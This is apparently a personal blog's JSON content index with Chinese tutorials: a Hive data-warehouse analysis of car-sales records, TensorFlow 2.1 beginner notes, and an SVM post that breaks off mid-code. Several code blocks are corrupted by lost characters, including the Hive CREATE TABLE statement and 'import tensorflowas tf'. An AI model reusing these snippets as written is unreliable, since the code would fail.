{"meta":{"title":"千里稻花应秀色","subtitle":"五更桐叶最佳音","description":"blogs by SSR","author":"SSR","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2021-07-20T05:00:42.000Z","updated":"2021-07-20T05:01:02.288Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-07-20T04:30:30.000Z","updated":"2021-07-20T04:59:41.047Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-07-20T05:00:01.000Z","updated":"2021-07-20T05:00:28.332Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"(Hive)汽车销售数据分析系统实战开发","slug":"Hive学习/Hive9","date":"2021-12-04T09:47:09.000Z","updated":"2021-12-08T08:11:37.485Z","comments":true,"path":"2021/12/04/Hive学习/Hive9/","link":"","permalink":"http://example.com/2021/12/04/Hive%E5%AD%A6%E4%B9%A0/Hive9/","excerpt":"","text":"本章围绕乘用车辆和商用车辆销售数据展开，通过 Hive 构建数据仓库，实现对汽车销售数据各项指标进行立体化分析。 # 数据概况 项目的数据来源于一个真实项目，数据项包括 “省，月，市，区县，年，车辆型号，制造商，品牌，车辆类型，所有权，使用性质，数量，发动机型号，排量，功率，燃料种类，车长，车宽，车高，厢长，厢宽，厢高，轴数，轴距，前轮距，轮胎规格，轮胎数，总质量，整备质量，核定载质量，核定载客，准牵引质量，底盘企业，底盘品牌，底盘型号，发动机企业，车辆名称，年龄，性别”。 1山西省,3,朔州市,朔城区,2013,LZW6450PF,上汽通用五菱汽车股份有限公司,五菱,小型普通客车,个人,非营运,1,L3C,8424,79,汽油,4490,1615,1900,10,45,26,2,3050,1386,175/70R14LT,4,2110,1275,,7,,,,,上汽通用五菱汽车股份有限公司,客车,1913,男性 # 项目实战 本节内容包括构建数据仓库、创建原始数据表、加载数据到数据仓库、验证数据结果以及具体的项目需求、设计思路、HiveSQL 设计以及 HiveSQL 运行结果等内容。 # 构建数据仓库 12345678hive (default)&gt; create database if not exists cars;OKTime taken: 7.501 secondshive (default)&gt; use cars;OKTime taken: 0.082 seconds # 创建原始数据表 1234567891011121314hive (cars)&gt; create external table car_2019712(province string comment &#x27;省&#x27;, month int commet &#x27;月&#x27;, city string comment &#x27;市&#x27;, district string comment &#x27;区县&#x27;, year int comment &#x27;年&#x27;, modring comment &#x27;车辆型号&#x27;, manufacturer string comment &#x27;制造商&#x27;, brand string comment &#x27;品牌&#x27;, pe string comment &#x27;车辆类型&#x27;, ownership string comment &#x27;所有权&#x27;,nature string comment &#x27;使用ity int comment &#x27;数量&#x27;, enginemodel string comment &#x27;发动 &gt; 机型号&#x27;, displacement int comment &#x27;排量&#x27;, power int comment &#x27;功率&#x27;, fuel stringt &#x27;燃料种类&#x27;, length1 int comment &#x27;车长&#x27;, width1 int comment &#x27;车宽&#x27;, height1 int comment &#x27;车h2 int comment &#x27;厢长&#x27;, width2 int comment &#x27;厢宽&#x27;, height2 int comment &#x27;厢高&#x27;, numberofaxles mment &#x27;轴数&#x27;, wheelbase int comment &#x27;轴距&#x27;, frontwheelbase int comment &#x27;前轮距&#x27;, tirespecifistring comment &#x27;轮胎规格&#x27;, tirenumber int comment &#x27;轮胎数&#x27;, totalquality int comment &#x27;总质量equality int comment &#x27;整备质量&#x27;, approvedquality int comment &#x27;核定载质量&#x27;, approvedpassengeromment &#x27;核定载客&#x27;, tractionquality int comment &#x27;准牵引质量&#x27;, chassisenterprise string commen chassisbrand string comment &#x27;底盘品牌&#x27;, chassismodel string comment &#x27;底盘型号&#x27;, engineenterring comment &#x27;发动机企业&#x27;, vehiclename string comment &#x27;车辆名称&#x27;, age int comment &#x27;年龄&#x27;, ge comment &#x27;性别&#x27;) comment &#x27;this is the raw data&#x27; row format delimited fields terminated by &#x27;,location &#x27;/cars&#x27;;OKTime taken: 0.766 secondshive (cars)&gt; desc car_2019712;OKcol_name data_type commentprovince string ? month int ? city string ? district string ?? year int ? ··· # 加载数据到数据仓库 在 HDFS 上创建存放数据的目录 /cars，如果 /cars 已存在，则无需创建 123[root@master ~]# hadoop fs -ls /Found 6 itemsdrwxr-xr-x - root supergroup 0 2021-12-04 17:54 /cars 将数据文档 cars.csv 利用 Xshell 上传到 master 的 /root 中 123[root@master ~]# ll总用量 171488-rw-r--r--. 1 root root 20702466 12月 4 18:02 cars.csv 用 Hadoop 命令行方式将数据加载到 Hive 数据仓库监控的目录中 1[root@master ~]# hadoop fs -put /root/cars.csv /cars # 验证数据结果 1234567hive (cars)&gt; select * from cars.car_2019712 limit 3;OKcar_2019712.province car_2019712.month car_2019712.city car_2019712.districcar_2019712.year car_2019712.model car_2019712.manufacturer car_2019712.brand car_2019712.vehicletype car_2019712.ownership car_2019712.nature car_2019712.quantitcar_2019712.enginemodel car_2019712.displacement car_2019712.power car_2019712.fuel car_2019712.length1 car_2019712.width1 car_2019712.height1 car_2019712.length2 car_2019712.width2 car_2019712.height2 car_2019712.numberofaxles car_2019712.wheelbase car_2019712.frontwheelbase car_2019712.tirespecification car_2019712.tirenumber car_2019712.totalquality car_2019712.completequality car_2019712.approvedquality car_2019712.approvedpassenger car_2019712.tractionquality car_2019712.chassisenterprise car_2019712.chassisbrand car_2019712.chassismodel car_2019712.engineenterprise car_2019712.vehiclename car_2019712.age car_2019712.gender山西省 3 朔州市 朔城区 2013 LZW6450PF 上汽通用五菱汽车股份有限公司 五菱小型普通客车 个人 非营运 1 L3C 8424 79 汽油 4490 1615 19010 45 26 2 3050 1386 175/70R14LT 4 2110 1275 NULNULL 上汽通用五菱汽车股份有限公司 客车 1913 男性山西省 3 晋城市 城区 2013 EQ6450PF1 东风小康汽车有限公司 东风 小型普通客车 个人 非营运 1 DK13-06 1587 74 汽油 4500 1680 19610 45 26 2 3050 1435 185R14LT 6PR 4 1970 1290 NULNULL 东风小康汽车有限公司 EQ6440KMF 重庆渝安淮海动力有限公司 客.1929 男性山西省 12 长治市 长治城区 2013 BJ6440BKV1A 北汽银翔汽车有限公司 北京小型普通客车 个人 非营运 1 BJ415A 1500 75 4440 NULL NUL10 45 26 NULL NULL NULL NULL NULL NULL NULL NULL 北汽银翔汽车有限公司 北京 BJ6440BKV1A 北汽银翔汽车有限公司 1938男性Time taken: 2.895 seconds, Fetched: 3 row(s) # 统计乘用车辆和商用车辆的销售数量和销售数量占比 根据字段 “nature” 即 “使用性质” 来分组统计乘用车辆和商用车辆的总数量，乘用车辆的使用性质为 “非营运”，商用车辆的使用性质为 “营运” 123456789hive (cars)&gt; select &#x27;非营运&#x27;, sum(if(a.nature=&#x27;非营运&#x27;,a.cnt,0)),&#x27;营运&#x27;,sum(if(a.nature!=&#x27;非t,0)) from (select nature, count(*) as cnt from cars.car_2019712 group by nature having nature is not null and nature!=&#x27;&#x27;) a;Job running in-process (local Hadoop)2021-12-04 18:06:17,810 Stage-1 map = 100%, reduce = 0%2021-12-04 18:06:18,832 Stage-1 map = 100%, reduce = 100%Ended Job = job_local1330125293_0001OK_c0 _c1 _c2 _c3非营运 66478 营运 3884Time taken: 6.564 seconds, Fetched: 1 row(s) 统计出汽车销售总数量 1234567hive (cars)&gt; select count(*) from cars.car_2019712;Job running in-process (local Hadoop)2021-12-04 18:07:45,241 Stage-1 map = 100%, reduce = 100%Ended Job = job_local445756713_0003OK_c070640 计算乘用车辆的销售数量占比 （66478/70640)*100%=94.1% 计算商用车辆的销售数量占比 （3884/70640)*100%=5.5% 还有 0.4% 属于其他类型的车辆 # 统计山西省 2013 年每个月的汽车销售数量的比例 分别统计出山西省 2013 年每个月的汽车销售数量和山西省 2013 年年度汽车销售总数量，再用 2013 年每个月的汽车销售数量除以年度汽车销售总数量。 12345678910111213141516171819202122hive (cars)&gt; set hive.strict.checks.cartesian.product=false;hive (cars)&gt; select month,c1.ss/c2.sumshu from (select month, sum(quantity) as ss from cars.car_2019712 where province=&#x27;山西省&#x27; and year=&#x27;2013&#x27; group by month) c1, (select sum(quantity) as sumshu from cars.car_2019712 where province=&#x27;山西省&#x27; and year=&#x27;2013&#x27;) c2;MapReduce Jobs Launched: Stage-Stage-1: HDFS Read: 124235252 HDFS Write: 12420 SUCCESSStage-Stage-3: HDFS Read: 165660827 HDFS Write: 39149 SUCCESSStage-Stage-4: HDFS Read: 82838654 HDFS Write: 25114 SUCCESSTotal MapReduce CPU Time Spent: 0 msecOKmonth _c11 0.147991813763110772 0.058312725618942043 0.093061595747704734 0.065873624968022515 0.07320712884795776 0.055470282254626087 0.063230152639208678 0.063784429095250289 0.0694835280407037910 0.104488218072254911 0.1005372217958557112 0.1045592791563628Time taken: 24.092 seconds, Fetched: 12 row(s) # 统计买车的男女比例及男女对车的品牌的选择 分别统计出买车的男性人数、女性人数和总人数，再分别用男性人数和女性人数除以购车总人数。 统计买车的男性占比和女性占比 123456789hive (cars)&gt; select &#x27;男性&#x27;, a.nan*1.0/(a.nan+a.nv),&#x27;女性&#x27;, a.nv*1.0/(a.nan+a.nv) from (selec性&#x27;, sum(if(b.gender=&#x27;男性&#x27;,b.cnt,0)) as nan, &#x27;女性&#x27;, sum(if(b.gender=&#x27;女性&#x27;,b.cnt,0)) as nvselect gender, count(*) as cnt from cars.car_2019712 group by gender having gender is not null and gender!= &#x27;&#x27;) b)a;MapReduce Jobs Launched: Stage-Stage-1: HDFS Read: 207083230 HDFS Write: 50347 SUCCESSStage-Stage-2: HDFS Read: 207092711 HDFS Write: 64901 SUCCESSTotal MapReduce CPU Time Spent: 0 msecOK_c0 _c1 _c2 _c3男性 0.70106593239522273 女性 0.29893406760477727Time taken: 4.188 seconds, Fetched: 1 row(s) 分析男性和女性对车的品牌的选择情况 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293hive (cars)&gt; select gender,brand,count(*) from cars.car_2019712 where gender is not null and gender!=&#x27;&#x27; and age is not null group by gender,brand having brand is not null and brand!=&#x27;&#x27;;MapReduce Jobs Launched: Stage-Stage-1: HDFS Read: 248503192 HDFS Write: 68889 SUCCESSTotal MapReduce CPU Time Spent: 0 msecOKgender brand _c2女性 一汽佳星 1男性 一汽佳星 2女性 东南 1男性 东南 12女性 东风 1367男性 东风 3214女性 中誉 4男性 中誉 2男性 中通 1女性 五菱 12004男性 五菱 28208女性 五菱宏光 1057男性 五菱宏光 2331女性 众泰 2男性 众泰 6女性 依维柯 32男性 依维柯 64女性 俊风 1男性 俊风 4女性 力帆 27男性 力帆 84女性 北京 741男性 北京 1836男性 合客 2女性 吉奥 12男性 吉奥 30男性 同心 1女性 哈飞 4男性 哈飞 7女性 大通 7男性 大通 31女性 大马 3男性 大马 7女性 奥路卡 125男性 奥路卡 277女性 宇通 6男性 宇通 7女性 少林 28男性 少林 72女性 尼桑 2男性 尼桑 2女性 开瑞 89男性 开瑞 231女性 恒通客车 2男性 恒通客车 2女性 昌河 20男性 昌河 75女性 昌河铃木 3男性 昌河铃木 1女性 松花江 25男性 松花江 86男性 柯斯达 6男性 梅赛德斯-奔驰 1女性 欧诺 121男性 欧诺 239男性 汇众 3女性 江淮 7男性 江淮 13女性 江铃全顺 84男性 江铃全顺 200女性 海格 1男性 海格 1女性 神剑 6男性 神剑 16女性 福田 17男性 福田 49女性 航天 31男性 航天 93女性 解放 96男性 解放 242女性 通家福 5男性 通家福 19女性 野马 8男性 野马 20女性 金旅 7男性 金旅 6女性 金杯 102男性 金杯 265女性 金龙 16男性 金龙 26女性 长城 2男性 长城 18女性 长安 1628男性 长安 3679男性 飞碟 3男性 黄海 2Time taken: 3.112 seconds, Fetched: 86 row(s) # 统计车的所有权、车辆型号和车辆类型 统计买车的所有权 123456789101112hive (cars)&gt; select ownership,count(*) as cnt from cars.car_2019712 group by ownership order by cnt desc;MapReduce Jobs Launched: Stage-Stage-1: HDFS Read: 289915770 HDFS Write: 72901 SUCCESSStage-Stage-2: HDFS Read: 289923419 HDFS Write: 83320 SUCCESSTotal MapReduce CPU Time Spent: 0 msecOKownership cnt个人 60745单位 9617NULL 273 5Time taken: 4.611 seconds, Fetched: 4 row(s) 统计车辆型号 123456789101112131415161718hive (cars)&gt; select model,count(*) as cnt from cars.car_2019712 group by model order by cnt desc limit 10;MapReduce Jobs Launched: Stage-Stage-1: HDFS Read: 331331684 HDFS Write: 114251 SUCCESSStage-Stage-2: HDFS Read: 331400570 HDFS Write: 155657 SUCCESSTotal MapReduce CPU Time Spent: 0 msecOKmodel cntLZW6376NF 13727LZW6407BAF 6357LZW6390QF 5967LZW6388NF 5120LZW6432KF 4097LZW6431MF 3622EQ6361PF6 2509SC6363B4S 2234LZW6430KF 1484LZW6390NF 1396Time taken: 4.495 seconds, Fetched: 10 row(s) 统计车辆类型 根据车辆类型字段 vehicletype 进行分组统计 123456789101112131415161718hive (cars)&gt; select vehicletype,count(*) as cnt from cars.car_2019712 group by vehicletype order by cnt desc limit 10; MapReduce Jobs Launched: Stage-Stage-1: HDFS Read: 372809322 HDFS Write: 156530 SUCCESSStage-Stage-2: HDFS Read: 372817774 HDFS Write: 167935 SUCCESSTotal MapReduce CPU Time Spent: 0 msecOKvehicletype cnt小型普通客车 62156 3276大型普通客车 3275中型普通客车 1398NULL 273大型专用校车 221中型专用校车 29小型专用客车 5大型铰接客车 3微型普通客车 2Time taken: 4.15 seconds, Fetched: 10 row(s) 统计所有权、车辆型号和车辆类型 统计车辆的 3 个维度：所有权、车辆型号和车辆类型。 1234567891011121314151617181920212223hive (cars)&gt; select a.cnt,count(*) from (select concat(model,ownership,vehicletype) as cnt from cars.car_2019712) a group by a.cnt;Stage-Stage-1: HDFS Read: 455821028 HDFS Write: 358380 SUCCESSTotal MapReduce CPU Time Spent: 0 msecOKa.cnt _c1NULL 273 5BFC6120B-1单位大型普通客车 7BFC6120B2单位大型普通客车 1BFC6900-2单位大型普通客车 8BJ6102U8LHB单位大型普通客车 1BJ6103U7MHB单位大型普通客车 1BJ6103U8LHB-4单位大型普通客车 3BJ6110U7LCB-1单位大型普通客车 6BJ6115U7AJB-1单位大型普通客车 1...ZQ6420A73F个人小型普通客车 63ZQ6420A73F单位小型普通客车 8ZQ6421A73AF个人小型普通客车 17ZQ6421A73AF单位小型普通客车 3ZZY6530A个人小型普通客车 6ZZY6530A单位小型普通客车 2Time taken: 1.686 seconds, Fetched: 1290 row(s) # 统计不同类型车在一个月（对应一段时间，如每月或每年) 的总销售 统计不同类型车在一个月的总销量。也就是统计某一年某一个月某一类型的车，如大型普通客车、小型普通客车等，销售了多少辆。 1234567891011121314hive (cars)&gt; select month,vehicletype,count(*) from cars.car_2019712 group by vehicletype, month having month is not null and vehicletype is not null and vehicletype!=&#x27;&#x27;;MapReduce Jobs Launched: Stage-Stage-1: HDFS Read: 497227388 HDFS Write: 362693 SUCCESSTotal MapReduce CPU Time Spent: 0 msecOKmonth vehicletype _c21 中型普通客车 1571 大型专用校车 41 大型普通客车 529...12 大型专用校车 812 大型普通客车 48212 小型普通客车 6701Time taken: 2.054 seconds, Fetched: 64 row(s) # 通过不同类型 (品牌) 车销售情况，来统计发动机型号和燃料种类 通过不同类型（品牌）车销售情况，统计发动机型号和燃料种类。也就是按车辆的品牌字段 brand、发动机型号字段 enginemodel 和燃油种类字段 fuel 进行分组统计。 1234567891011hive (cars)&gt; select brand,enginemodel,fuel,count(*) from cars.car_2019712 group by brand,enginemodel,fuel;MapReduce Jobs Launched: Stage-Stage-1: HDFS Read: 580122636 HDFS Write: 444919 SUCCESSTotal MapReduce CPU Time Spent: 0 msecOKbrand enginemodel fuel _c3...黄海 YC6J245-30 柴油 17黄海 YC6J245-42 柴油 2黄海 YC6L330-30 柴油 1Time taken: 1.765 seconds, Fetched: 757 row(s) # 统计五菱某一年每月的销售量 统计五菱汽车某一年每月的销售量，可以按汽车的品牌 brand 和月 month 两个字段进行分组统计，并从结果中将品牌名为 “五菱” 的数据过滤出来即可。 12345678910111213141516171819hive (cars)&gt; select brand,month,count(*) from cars.car_2019712 group by brand,month having brand=&#x27;五菱&#x27;;MapReduce Jobs Launched: Stage-Stage-1: HDFS Read: 621528450 HDFS Write: 445834 SUCCESSTotal MapReduce CPU Time Spent: 0 msecOKbrand month _c2五菱 1 5589五菱 2 2226五菱 3 3557五菱 4 2389五菱 5 3351五菱 6 2302五菱 7 2893五菱 8 2980五菱 9 3422五菱 10 5278五菱 11 4809五菱 12 4963Time taken: 1.863 seconds, Fetched: 12 row(s) # 本章小结 本章通过汽车销售数据项目让大家感受了企业大数据项目的开发流程。","categories":[{"name":"Hive","slug":"Hive","permalink":"http://example.com/categories/Hive/"}],"tags":[{"name":"大数据","slug":"大数据","permalink":"http://example.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"}]},{"title":"第一讲 神经网络计算","slug":"机器学习/TensorFlow笔记/Ch1","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-12T09:34:21.109Z","comments":true,"path":"2021/11/08/机器学习/TensorFlow笔记/Ch1/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/TensorFlow%E7%AC%94%E8%AE%B0/Ch1/","excerpt":"","text":"# 实验环境准备 Anoconda3.7 TensorFlow2.1 PyCharm # 安装 Anoconda 官网下载安装，勾选添加到环境变量。 # 安装 TensorFlow2.1 1 打开安装好的 Anoconda Prompt 2 创建一个环境 12conda create -n TF2.1 python=3.7y 3 进入新创建的环境 1conda activate TF2.1 4 安装所需软件 1234567#安装英伟达SDK10.1版本conda install cudatoolkit=10.1#安装英伟达深度学习软件包7.6版本conda install cudann=7.6#以上两条是为了支持N卡GPU，如果报错，暂时跳过#安装TensorFlow，指定版本2.1pip install tensorflow==2.1 5 验证安装 123pythonimport tensorflow as tf tf.__version__ # 安装 PyCharm 官网下载安装 # 新建工程 打开 PyCharm，新建工程，添加创建好的环境 TF2.1 右键工程文件夹选择在文件管理器中打开（open in explorer） 将课程代码拷贝进入工程目录 # 神经网络计算 本讲目标：学会神经网络计算过程，使用基于 TF2 原生代码搭建你的第一个的神经网络训练模型 当今人工智能主流方向 —— 连接主义 前向传播 损失函数（初体会） 梯度下降（初体会） 学习率（初体会） 反向传播更新参数 Tensorflow2 常用函数 # 1.1 人工智能三学派 人工智能：让机器具备人的思维和意识。 人工智能三学派： 行为主义：基于控制论，构建感知 - 动作控制系统。 （控制论，如平衡、行走、避障等自适应控制系统） 符号主义：基于算数逻辑表达式，求解问题时先把问题描述为表达式，再求解表达式。 （可用公式描述、实现理性思维，如专家系统） 连接主义：仿生学，模仿神经元连接关系。本课重点 （仿脑神经元连接，实现感性思维，如神经网络） # 1.2 基于连结主义的神经网络设计过程 用计算机仿出神经网络连接关系，让计算机具备感性思维。 准备数据：采集大量 “特征 / 标签” 数据 搭建网络：搭建神经网络结构 优化参数：训练网络获取最佳参数（反传） 应用网络：将网络保存为模型，输入新数据，输出分类或预测结果（前传） # 1.3 TF2 TensorFlow2 2019 年 3 月 Tensorflow2.0 测试版发布 2019 年 10 月 Tensorflow2.0 正式版发布 2020 年 1 月 Tensorflow2.1 发布 张量 张量（Tensor）：多维数组（列表）阶：张量的维数 维数 阶 名字 例子 0-D 0 标量 scalar s=123 1-D 1 向量 vector v=[1,2,3] 2-D 2 矩阵 matrix m=[[1,2,3],[4,5,6],[7,8,9]] 3-D n 张量 tensor t=[[[…]]] 数据类型 tf.int, tf.float…… tf.int 32, tf.float32, tf.float64 tf.bool tf.constant([True, False]) tf.string tf.constant(“Hello, world!”) 如何创建一个 Tensor tf 创建一个张量 tf.constant (张量内容，dtype = 数据类型 (可选)) 12345import tensorflowas tfa=tf.constant([1,5],dtype=tf.int64)print(a)print(a.dtype)print(a.shape) 将 numpy 的数据类型转换为 Tensor 数据类型 tf. convert_to_tensor (数据名，dtype = 数据类型 (可选)) 123456import tensorflowas tfimport numpyas npa = np.arange(0, 5)b = tf.convert_to_tensor( a, dtype=tf.int64 )print(a)print(b) 创建全为 0 的张量 tf. zeros (维度) 创建全为 1 的张量 tf. ones (维度) 创建全为指定值的张量 tf. fill (维度，指定值) 123456789101112&#x27;&#x27;&#x27;维度：一维直接写个数二维用[行，列]多维用[n,m,j,k……]&#x27;&#x27;&#x27;a = tf.zeros([2, 3])b = tf.ones(4)c = tf.fill([2, 2], 9)print(a)print(b)print(c) 生成正态分布的随机数，默认均值为 0，标准差为 1 tf. random.normal (维度，mean = 均值，stddev = 标准差) 生成截断式正态分布的随机数 tf. random.truncated_normal (维度，mean = 均值，stddev = 标准差) 在 tf.truncated_normal 中如果随机生成数据的取值在（μ-2σ，μ+2σ）之外则重新进行生成，保证了生成值在均值附近。 μ：均值，σ：标准差 1234d = tf.random.normal([2, 2], mean=0.5, stddev=1)print(d)e = tf.random.truncated_normal([2, 2], mean=0.5, stddev=1)print(e) 生成均匀分布随机数 [minval, maxval) tf. random. uniform (维度，minval = 最小值，maxval = 最大值) 12f = tf.random.uniform([2, 2], minval=0, maxval=1)print(f) # 1.4 TF2 常用函数 强制 tensor 转换为该数据类型 tf.cast (张量名，dtype = 数据类型) 计算张量维度上元素的最小值 tf.reduce_min (张量名) 计算张量维度上元素的最大值 tf.reduce_max (张量名) 1234567891011121314x1 = tf.constant([1., 2., 3.],dtype=tf.float64)print(x1)x2 = tf.cast(x1, tf.int32)print(x2)print (tf.reduce_min(x2), tf.reduce_max(x2))&#x27;&#x27;&#x27;理解axis在一个二维张量或数组中，可以通过调整axis 等于0或1 控制执行维度。axis=0代表跨行（经度，down)，而axis=1代表跨列（纬度，across)如果不指定axis，则所有元素参与计算。&#x27;&#x27;&#x27; 计算张量沿着指定维度的平均值 tf.reduce_mean (张量名，axis = 操作轴) 计算张量沿着指定维度的和 tf.reduce_sum (张量名，axis = 操作轴) 1234x=tf.constant( [ [ 1, 2, 3],[ 2, 2, 3] ] )print(x)print(tf.reduce_mean( x ))print(tf.reduce_sum( x, axis=1 )) tf.Variable() tf.Variable () 将变量标记为 “可训练”，被标记的变量会在反向传播中记录梯度信息。神经网络训练中，常用该函数标记待训练参数。 tf.Variable (初始值) w = tf.Variable(tf.random.normal([2, 2], mean=0, stddev=1)) TensorFlow 中的数学运算 对应元素的四则运算：tf.add，tf.subtract，tf.multiply，tf.divide 只有维度相同的张量才可以做四则运算 12345678a = tf.ones([1, 3])b = tf.fill([1, 3], 3.)print(a)print(b)print(tf.add(a,b))print(tf.subtract(a,b))print(tf.multiply(a,b))print(tf.divide(b,a)) 平方、次方与开方： tf.square，tf.pow，tf.sqrt 12345a = tf.fill([1, 2], 3.)print(a)print(tf.pow(a, 3))print(tf.square(a))print(tf.sqrt(a)) 矩阵乘：tf.matmul 123456&#x27;&#x27;&#x27;tf.matmul(矩阵1，矩阵2)&#x27;&#x27;&#x27;a = tf.ones([3, 2])b = tf.fill([2, 3], 3.)print(tf.matmul(a, b)) tf.data.Dataset.from_tensor_slices 123456789101112&#x27;&#x27;&#x27;切分传入张量的第一维度，生成输入特征/标签对，构建数据集data = tf.data.Dataset.from_tensor_slices((输入特征, 标签))（Numpy和Tensor格式都可用该语句读入数据）&#x27;&#x27;&#x27;features = tf.constant([12,23,10,17])labels = tf.constant([0, 1, 1, 0])dataset = tf.data.Dataset.from_tensor_slices((features, labels))print(dataset)for element in dataset: print(element) tf.GradientTape 1234567891011&#x27;&#x27;&#x27;with结构记录计算过程，gradient求出张量的梯度with tf.GradientTape( ) as tape: 若干个计算过程grad=tape.gradient(函数，对谁求导)&#x27;&#x27;&#x27;with tf.GradientTape( ) as tape: w = tf.Variable(tf.constant(3.0)) loss = tf.pow(w,2)grad = tape.gradient(loss,w)print(grad) enumerate 123456789&#x27;&#x27;&#x27;enumerate是python的内建函数，它可遍历每个元素(如列表、元组或字符串)，组合为：索引 元素，常在for循环中使用。enumerate(列表名)&#x27;&#x27;&#x27;seq = [&#x27;one&#x27;, &#x27;two&#x27;, &#x27;three&#x27;]for i, element in enumerate(seq): print(i, element) tf.one_hot 12345678910&#x27;&#x27;&#x27;独热编码（one-hot encoding）：在分类问题中，常用独热码做标签，标记类别：1表示是，0表示非.tf.one_hot (待转换数据, depth=几分类)&#x27;&#x27;&#x27;classes = 3labels = tf.constant([1,0,2]) # 输入的元素值最小为0，最大为2output = tf.one_hot( labels, depth=classes )print(output) tf.nn.softmax 123456&#x27;&#x27;&#x27;tf.nn.softmax(x) 使输出符合概率分布&#x27;&#x27;&#x27;y = tf.constant ( [1.01, 2.01, -0.66] )y_pro = tf.nn.softmax(y)print(&quot;After softmax, y_pro is:&quot;, y_pro) assign_sub 12345678&#x27;&#x27;&#x27;赋值操作，更新参数的值并返回。调用assign_sub前，先用 tf.Variable 定义变量 w 为可训练（可自更新）。w.assign_sub (w要自减的内容) &#x27;&#x27;&#x27;w = tf.Variable(4)w.assign_sub(1)print(w) tf.argmax 12345678&#x27;&#x27;&#x27;返回张量沿指定维度最大值的索引tf.argmax (张量名,axis=操作轴)&#x27;&#x27;&#x27;import numpy as nptest = np.array([[1, 2, 3], [2, 3, 4], [5, 4, 3], [8, 7, 2]])print(test)print( tf.argmax (test, axis=0)) # 返回每一列（经度）最大值的索引print( tf.argmax (test, axis=1)) # 返回每一行（纬度）最大值的索引 # 1.5 神经网络实现鸢尾花分类 # 数据集介绍 共有数据 150 组，每组包括花萼长、花萼宽、花瓣长、花瓣宽 4 个输入特征。同时给出了，这一组特征对应的鸢尾花类别。类别包括 Setosa Iris（狗尾草鸢尾），Versicolour Iris（杂色鸢尾），Virginica Iris（弗吉尼亚鸢尾）三类，分别用数字 0，1，2 表示。 # 准备数据 1234567891011121314151617181920#数据集读入#从sklearn包datasets 读入数据集：from sklearn.datasets import datasetsx_data = datasets.load_iris().data 返回iris数据集所有输入特征y_data = datasets.load_iris().target 返回iris数据集所有标签#数据集乱序np.random.seed(116) # 使用相同的seed，使输入特征/标签一一对应np.random.shuffle(x_data)np.random.seed(116)np.random.shuffle(y_data)tf.random.set_seed(116)#数据集分出永不相见的训练集和测试集x_train = x_data[:-30]y_train = y_data[:-30]x_test = x_data[-30:]y_test = y_data[-30:]#配成[输入特征，标签]对，每次喂入一小撮（batch）train_db = tf.data.Dataset.from_tensor_slices((x_train, y_train)).batch(32)test_db = tf.data.Dataset.from_tensor_slices((x_test, y_test)).batch(32) # 搭建网络 1234#定义神经网路中所有可训练参数w1 = tf.Variable(tf.random.truncated_normal([ 4, 3 ], stddev=0.1, seed=1))b1 = tf.Variable(tf.random.truncated_normal([ 3 ], stddev=0.1, seed=1)) # 参数优化 12345678910#嵌套循环迭代，with结构更新参数，显示当前lossfor epoch in range(epoch): #数据集级别迭代 for step, (x_train, y_train) in enumerate(train_db): #batch级别迭代 with tf.GradientTape() as tape: # 记录梯度信息 前向传播过程计算y 计算总loss grads = tape.gradient(loss, [ w1, b1 ]) w1.assign_sub(lr * grads[0]) #参数自更新 b1.assign_sub(lr * grads[1]) print(&quot;Epoch &#123;&#125;, loss: &#123;&#125;&quot;.format(epoch, loss_all/4)) # 测试效果 123456789101112# 计算当前参数前向传播后的准确率，显示当前accfor x_test, y_test in test_db:y = tf.matmul(h, w) + b # y为预测结果y = tf.nn.softmax(y) # y符合概率分布pred = tf.argmax(y, axis=1) # 返回y中最大值的索引，即预测的分类pred = tf.cast(pred, dtype=y_test.dtype) #调整数据类型与标签一致correct = tf.cast(tf.equal(pred, y_test), dtype=tf.int32)correct = tf.reduce_sum (correct) # 将每个batch的correct数加起来total_correct += int (correct) # 将所有batch中的correct数加起来total_number += x_test.shape [0]acc = total_correct / total_numberprint(&quot;test_acc:&quot;, acc) # acc/loss 可视化 1234567#acc / loss可视化plt.title(&#x27;Acc Curve&#x27;) # 图片标题plt.xlabel(&#x27;Epoch&#x27;) # x轴名称plt.ylabel(&#x27;Acc&#x27;) # y轴名称plt.plot(test_acc, label=&quot;$Accuracy$&quot;) # 逐点画出test_acc值并连线plt.legend()plt.show()","categories":[{"name":"TensorFlow笔记","slug":"TensorFlow笔记","permalink":"http://example.com/categories/TensorFlow%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"基于支持向量机的分类预测","slug":"机器学习/天池/基于支持向量机的分类预测","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:30:02.739Z","comments":true,"path":"2021/11/08/机器学习/天池/基于支持向量机的分类预测/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8E%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/","excerpt":"","text":"# 1 前言 支持向量机（Support Vector Machine，SVM）是一个非常优雅的算法，具有非常完善的数学理论，常用于数据分类，也可以用于数据的回归预测中，由于其其优美的理论保证和利用核函数对于线性不可分问题的处理技巧，在上世纪 90 年代左右，SVM 曾红极一时。 本文将不涉及非常严格和复杂的理论知识，力求于通过直觉来感受 SVM。 # 2 学习目标 了解支持向量机的分类标准； 了解支持向量机的软间隔分类； 了解支持向量机的非线性核函数分类； # 3 代码流程 # Demo 实践 Step1: 库函数导入 Step2: 构建数据集并进行模型训练 Step3: 模型参数查看 Step4: 模型预测 Step5: 模型可视化 # 4. 算法实战 # 4.1 Demo 实践 首先我们利用 sklearn 直接调用 SVM 函数进行实践尝试 Step1: 库函数导入 123456789## 基础函数库import numpy as np ## 导入画图库import matplotlib.pyplot as pltimport seaborn as sns## 导入逻辑回归模型函数from sklearn import 